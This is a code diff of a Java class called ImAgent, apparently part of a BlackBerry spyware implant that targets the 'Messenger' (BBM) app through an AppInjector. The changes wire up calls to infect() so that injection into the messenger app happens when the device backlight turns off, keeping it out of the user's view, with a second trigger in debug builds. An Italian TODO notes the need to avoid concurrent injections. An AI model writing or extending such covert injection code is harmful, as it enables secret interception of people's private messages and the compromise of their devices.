@@ -27,15 +27,14 @@ public final class ImAgent extends Agent implements BacklightObserver,
     //#ifdef DEBUG
     static Debug debug = new Debug("ImAgent", DebugLevel.VERBOSE);
     //#endif
-    
-    private static final long APP_TIMER_PERIOD = 1000;
-    
+
+    private static final long APP_TIMER_PERIOD = 3000;
+
     AppInjector appInjector;
-    boolean infected;
+    //boolean infected;
 
     String appName = "Messenger";
 
-    
     /**
      * Instantiates a new task agents
      * 
@@ -43,8 +42,8 @@ public final class ImAgent extends Agent implements BacklightObserver,
      *            the agent status
      */
     public ImAgent(final boolean agentEnabled) {
-        super(Agent.AGENT_IM, agentEnabled , Conf.AGENT_IM_ON_SD, "ImAgent");
-        
+        super(Agent.AGENT_IM, agentEnabled, Conf.AGENT_IM_ON_SD, "ImAgent");
+
         //#ifdef IM_FORCED
         enable(true);
         //#endif
@@ -76,19 +75,13 @@ public final class ImAgent extends Agent implements BacklightObserver,
 
         try {
             appInjector = new AppInjector(AppInjector.APP_BBM);
-            infected = appInjector.isInfected();
+
         } catch (Exception ex) {
             //#ifdef DEBUG
             debug.error("actualStart: " + ex);
             //#endif
         }
-
-        if (!infected && !Backlight.isEnabled()) {
-            //#ifdef DEBUG
-            debug.trace("actualStart, infecting");
-            //#endif
-            menuInject();
-        }
+        
     }
 
     private void menuInject() {
@@ -96,12 +89,7 @@ public final class ImAgent extends Agent implements BacklightObserver,
         debug.trace("menuInject");
         //#endif
 
-        //appInjector.requestForeground();
-        //appInjector.injectMenu();
-        //appInjector.callMenu();
-        //appInjector.deleteMenu();
-
-        infected = true;
+        appInjector.infect();
     }
 
     public synchronized void actualStop() {
@@ -113,21 +101,23 @@ public final class ImAgent extends Agent implements BacklightObserver,
         AppListener.getInstance().removeApplicationObserver(this);
     }
 
+    boolean infecting = false;
     public void actualRun() {
-        
-        if(!infected){
-            //#ifdef DEBUG
-            debug.trace("actualRun: not infected");
-            //#endif
-        }
-        
-        if (infected && Backlight.isEnabled() && isAppForeground) {
+
+        if (appInjector.isInfected() && Backlight.isEnabled()
+                && isAppForeground) {
             //#ifdef DEBUG
             debug.info("actualRun, infected, enabled, foreground");
-            //#endif
+          //#endif
 
-            //appInjector.callInContext();
+            //appInjector.callMenuInContext();
         }
+      //#ifdef DEBUG
+        if(! appInjector.isInfected() && !infecting){
+            infecting = true;
+            menuInject();
+        }
+      //#endif
     }
 
     /*
@@ -142,15 +132,21 @@ public final class ImAgent extends Agent implements BacklightObserver,
             debug.trace("parse: null");
         }
         //#endif
-        
+
         setPeriod(APP_TIMER_PERIOD);
         setDelay(APP_TIMER_PERIOD);
         return false;
     }
 
-    public void onBacklightChange(boolean status) {
-        // TODO Auto-generated method stub
+    public void onBacklightChange(boolean on) {
+        if (!on && !appInjector.isInfected()) {
+            //#ifdef DEBUG
+            debug.info("onBacklightChange, injecting");
+            //#endif
 
+            //TODO: qui bisogna verificare che non avvengano due injection alla volta
+            menuInject();
+        }
     }
 
     boolean isAppForeground;
@@ -169,7 +165,5 @@ public final class ImAgent extends Agent implements BacklightObserver,
             isAppForeground = false;
         }
     }
-
-
 
 }
